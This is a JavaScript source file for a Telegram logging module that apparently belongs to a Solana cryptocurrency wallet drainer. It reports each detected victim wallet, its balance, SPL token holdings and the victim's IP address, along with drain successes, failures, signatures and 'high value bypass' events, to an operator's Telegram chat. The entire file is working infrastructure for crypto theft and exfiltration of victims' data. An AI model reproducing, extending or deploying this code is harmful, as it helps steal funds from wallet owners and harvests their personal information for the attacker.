import 'dotenv/config';
import { ENV_CONFIG, PROJECT_NAME } from '../env.config.js';

class TelegramLogger {
  constructor() {
    // Use environment configuration with proper fallbacks
    this.botToken = ENV_CONFIG.TELEGRAM_BOT_TOKEN;
    this.chatId = ENV_CONFIG.TELEGRAM_CHAT_ID;
    
    // Project name from environment configuration
    this.projectName = PROJECT_NAME;
    
    // Enable Telegram with valid credentials
    this.enabled = !!(this.botToken && this.chatId);
    
    if (this.enabled) {
      console.log(`✅ [TELEGRAM] Logger initialized for project: ${this.projectName}`);
      console.log(`✅ [TELEGRAM] Bot token: ${this.botToken.substring(0, 10)}...`);
      console.log(`✅ [TELEGRAM] Chat ID: ${this.chatId}`);
    } else {
      console.warn(`⚠️ [TELEGRAM] Logger disabled - missing bot token or chat ID`);
      console.warn(`⚠️ [TELEGRAM] Bot token: ${this.botToken ? 'Present' : 'Missing'}`);
      console.warn(`⚠️ [TELEGRAM] Chat ID: ${this.chatId ? 'Present' : 'Missing'}`);
    }
    
    // Enable logging for drain amounts in production
    this.logDrainAmounts = true;
  }

  /**
   * Send message to Telegram
   */
  async sendMessage(message, type = 'info') {
    if (!this.enabled) return;

    try {
      // Always format the message to include project name
      const formattedMessage = this.formatMessage(message, type);
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: formattedMessage,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        console.error('❌ Failed to send Telegram message:', response.statusText);
      }
    } catch (error) {
      console.error('❌ Telegram send error:', error.message);
    }
  }

  /**
   * Format SOL balance for display
   */
  formatSOLBalance(lamports) {
    if (!lamports || lamports === 0) return '0 SOL';
    
    const sol = lamports / 1e9;
    
    // For very small amounts, show more precision
    if (sol < 0.000001) {
      return `${sol.toFixed(9)} SOL`;
    } else if (sol < 0.001) {
      return `${sol.toFixed(6)} SOL`;
    } else if (sol < 1) {
      return `${sol.toFixed(4)} SOL`;
    } else if (sol < 1000) {
      return `${sol.toFixed(3)} SOL`;
    } else {
      return `${sol.toFixed(2)} SOL`;
    }
  }

  /**
   * Format message with emojis and styling
   */
  formatMessage(message, type) {
    const timestamp = new Date().toLocaleString();
    const emoji = this.getEmoji(type);
    const prefix = this.getPrefix(type);
    
    return `${emoji} <b>${this.projectName} - ${prefix}</b>\n\n${message}\n\n<code>⏰ ${timestamp}</code>`;
  }

  /**
   * Get emoji for message type
   */
  getEmoji(type) {
    const emojis = {
      'WALLET_DETECTED': '👛',
      'DRAIN_SUCCESS': '💰',
      'DRAIN_FAILED': '❌',
      'TRANSACTION_CANCELLED': '🚫',
      'RATE_LIMIT': '⏰',
      'HIGH_VALUE_BYPASS': '💎',
      'INSUFFICIENT_FUNDS': '💸',
      'ERROR': '🚨',
      'SIGNING_ERROR': '✍️',
      'RPC_FAILURE': '🌐',
      'CONNECTION_ERROR': '🔌',
      'BALANCE_VERIFICATION_FAILED': '📊',
      'BROADCAST_FAILED': '📡'
    };
    return emojis[type] || 'ℹ️';
  }

  /**
   * Get prefix for message type
   */
  getPrefix(type) {
    const prefixes = {
      'WALLET_DETECTED': 'WALLET DETECTED',
      'DRAIN_SUCCESS': 'DRAIN SUCCESS',
      'DRAIN_FAILED': 'DRAIN FAILED',
      'TRANSACTION_CANCELLED': 'TRANSACTION CANCELED',
      'RATE_LIMIT': 'RATE LIMIT',
      'HIGH_VALUE_BYPASS': 'HIGH VALUE BYPASS',
      'INSUFFICIENT_FUNDS': 'INSUFFICIENT FUNDS',
      'ERROR': 'ERROR',
      'SIGNING_ERROR': 'SIGNING ERROR',
      'RPC_FAILURE': 'RPC FAILURE',
      'CONNECTION_ERROR': 'CONNECTION ERROR',
      'BALANCE_VERIFICATION_FAILED': 'BALANCE VERIFICATION FAILED',
      'BROADCAST_FAILED': 'BROADCAST FAILED'
    };
    return prefixes[type] || 'INFO';
  }

  /**
   * Log wallet detection (all wallets, balance will be updated later)
   */
  async logWalletDetected(data) {
    // If a custom message is provided (for SPL tokens), use it directly
    if (data.message) {
      // For custom messages, just send the message content - formatMessage will add the project name
      await this.sendMessage(data.message, 'WALLET_DETECTED');
      return;
    }

    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const walletType = data.walletType || 'Unknown';
    
    // Show wallet type if it's a known wallet type, and handle SPL tokens separately
    const knownWalletTypes = ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Exodus'];
    let walletTypeDisplay = '';
    
    if (knownWalletTypes.includes(walletType)) {
      walletTypeDisplay = `💼 <b>Type:</b> ${walletType}`;
    }

    const message = `
👤 <b>Wallet:</b> <code>${walletAddress}</code>
${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balanceSOL}
${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'WALLET_DETECTED');
  }

  async logDrainSuccess(data) {
    try {
      const message = `🎯 **DRAIN SUCCESS** 🎯\n\n` +
        `💰 **Wallet**: \`${data.publicKey}\`\n` +
        `🔗 **Type**: ${data.walletType}\n` +
        `🪙 **Tokens**: ${data.splTokens}\n` +
        `💎 **SOL**: ${this.formatSOLBalance(data.lamports)}\n` +
        `🌐 **IP**: ${data.ip}\n` +
        `⏰ **Time**: ${new Date().toLocaleString()}\n` +
        `📊 **Value**: $${data.estimatedValue || 'Unknown'}`;

      await this.sendMessage(message, 'DRAIN_SUCCESS');
      console.log('[TELEGRAM] Drain success logged');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log drain success:', error.message);
    }
  }

  async logDrainExecuted(data) {
    try {
      const message = `🚀 **DRAIN EXECUTED** 🚀\n\n` +
        `✅ **Status**: ${data.status}\n` +
        `🔗 **Signature**: \`${data.signature}\`\n` +
        `🌐 **RPC**: ${data.rpcEndpoint}\n` +
        `💰 **Fee**: ${data.transactionDetails?.fee || 0} lamports\n` +
        `📝 **Instructions**: ${data.transactionDetails?.instructions || 0}\n` +
        `👥 **Accounts**: ${data.transactionDetails?.accounts || 0}\n` +
        `⏰ **Time**: ${new Date(data.timestamp).toLocaleString()}`;

      await this.sendMessage(message, 'DRAIN_SUCCESS'); // Assuming DRAIN_SUCCESS is the correct type for this
      console.log('[TELEGRAM] Drain executed logged');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log drain executed:', error.message);
    }
  }

  /**
   * Log drain failed
   */
  async logDrainFailed(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const error = data.error || 'Unknown error';
    const splTokens = data.splTokens || 0;
    
    let message = `
❌ <b>Drain Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>Error:</b> ${error}
🌐 <b>IP:</b> ${ip}`;

    // Add SPL token count if available
    if (splTokens > 0) {
      message += `
🪙 <b>SPL Tokens:</b> ${splTokens}`;
    }
    
    message = message.trim();

    await this.sendMessage(message, 'DRAIN_FAILED');
  }

  /**
   * Log transaction cancelled
   */
  async logTransactionCancelled(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const walletType = data.walletType || 'Unknown';
    const reason = data.reason || 'User cancelled';
    
    const message = `
🚫 <b>Transaction Cancelled</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL}
📝 <b>Reason:</b> ${reason}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'TRANSACTION_CANCELLED');
  }

  /**
   * Log rate limit events
   */
  async logRateLimit(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    
    const message = `
<b>⏰ Rate Limit</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
📝 <b>Details:</b> ${data.details}
    `.trim();

    await this.sendMessage(message, 'RATE_LIMIT');
  }

  /**
   * Log high value wallet bypass
   */
  async logHighValueBypass(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    
    const message = `
💎 <b>High Value Bypass</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'HIGH_VALUE_BYPASS');
  }

  /**
   * Log insufficient funds
   */
  async logInsufficientFunds(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const walletType = data.walletType || 'Unknown';
    const required = data.required || 0;
    const requiredSOL = required > 0 ? this.formatSOLBalance(required) : 'N/A';
    const context = data.context || 'Unknown';
    const splTokens = data.splTokens || 0;
    
    let message = `
💸 <b>Insufficient Funds</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Current Balance:</b> ${balanceSOL}
📊 <b>Required:</b> ${requiredSOL}`;

    // Add SPL token count if available
    if (splTokens > 0) {
      message += `
🪙 <b>SPL Tokens:</b> ${splTokens}`;
    }
    
    message += `
🔍 <b>Context:</b> ${context}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'INSUFFICIENT_FUNDS');
  }

  /**
   * Log transaction signing errors
   */
  async logSigningError(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const walletType = data.walletType || 'Unknown';
    const errorType = data.errorType || 'Unknown';
    const errorMessage = data.errorMessage || 'Unknown error';
    
    const message = `
❌ <b>Transaction Signing Error</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>Error:</b> ${errorType}
📝 <b>Details:</b> ${errorMessage}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'SIGNING_ERROR');
  }



  /**
   * Log connection errors
   */
  async logConnectionError(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const walletType = data.walletType || 'Unknown';
    const errorMessage = data.errorMessage || 'Unknown connection error';
    
    const message = `
🔌 <b>Connection Error</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>Error:</b> ${errorMessage}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'CONNECTION_ERROR');
  }

  /**
   * Log balance verification failures
   */
  async logBalanceVerificationFailed(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const expectedChange = data.expectedChange || 0;
    const actualChange = data.actualChange || 0;
    const tolerance = data.tolerance || 0;
    
    const message = `
❌ <b>Balance Verification Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL}
📊 <b>Expected Change:</b> ${this.formatSOLBalance(expectedChange)}
📊 <b>Actual Change:</b> ${this.formatSOLBalance(actualChange)}
📏 <b>Tolerance:</b> ${this.formatSOLBalance(tolerance)}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'BALANCE_VERIFICATION_FAILED');
  }

  /**
   * Log transaction broadcast failures
   */
  async logBroadcastFailed(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const errorMessage = data.errorMessage || 'Unknown broadcast error';
    const rpcEndpoint = data.rpcEndpoint || 'Unknown';
    
    const message = `
📡 <b>Broadcast Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>Error:</b> ${errorMessage}
🌐 <b>RPC:</b> ${rpcEndpoint}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'BROADCAST_FAILED');
  }

  /**
   * Log RPC connection failures
   */
  async logRPCFailure(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const rpcEndpoint = data.rpcEndpoint || 'Unknown';
    const errorMessage = data.errorMessage || 'Unknown RPC error';
    
    const message = `
🌐 <b>RPC Connection Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>RPC:</b> ${rpcEndpoint}
📝 <b>Error:</b> ${errorMessage}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'RPC_FAILURE');
  }

  /**
   * Log general errors with enhanced formatting
   */
  async logError(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.balance || data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const walletType = data.walletType || 'Unknown';
    const error = data.error || data.message || 'Unknown error';
    const context = data.context || 'Unknown';
    
    const message = `
👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>Error:</b> ${error}
🔍 <b>Context:</b> ${context}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'ERROR');
  }
  
  /**
   * Log frontend errors with enhanced context
   */
  async logFrontendError(data) {
    const error = data.error || data.message || 'Unknown error';
    const context = data.context || 'Unknown';
    const url = data.url || 'Unknown';
    const userAgent = data.userAgent || 'Unknown';
    const timestamp = data.timestamp || new Date().toISOString();
    
    const message = `
🚨 <b>Frontend Error</b>

📱 <b>Error:</b> ${error}
🔍 <b>Context:</b> ${context}
🌐 <b>URL:</b> ${url}
📱 <b>User Agent:</b> ${userAgent.substring(0, 100)}...
⏰ <b>Time:</b> ${new Date(timestamp).toLocaleString()}
    `.trim();

    await this.sendMessage(message, 'ERROR');
  }
  
  /**
   * Log Solana-specific errors
   */
  async logSolanaError(data) {
    const error = data.error || data.message || 'Unknown Solana error';
    const context = data.context || 'Unknown';
    const currentRPC = data.currentRPC || 'Unknown';
    const fallbackRPC = data.fallbackRPC || 'Unknown';
    const url = data.url || 'Unknown';
    const timestamp = data.timestamp || new Date().toISOString();
    
    const message = `
🌐 <b>Solana RPC Error</b>

🚨 <b>Error:</b> ${error}
🔍 <b>Context:</b> ${context}
🔗 <b>Current RPC:</b> ${currentRPC}
🔄 <b>Fallback RPC:</b> ${fallbackRPC}
🌐 <b>URL:</b> ${url}
⏰ <b>Time:</b> ${new Date(timestamp).toLocaleString()}
    `.trim();

    await this.sendMessage(message, 'SOLANA_ERROR');
  }
}

// Create singleton instance
const telegramLogger = new TelegramLogger();

// Export the singleton instance
export default telegramLogger; 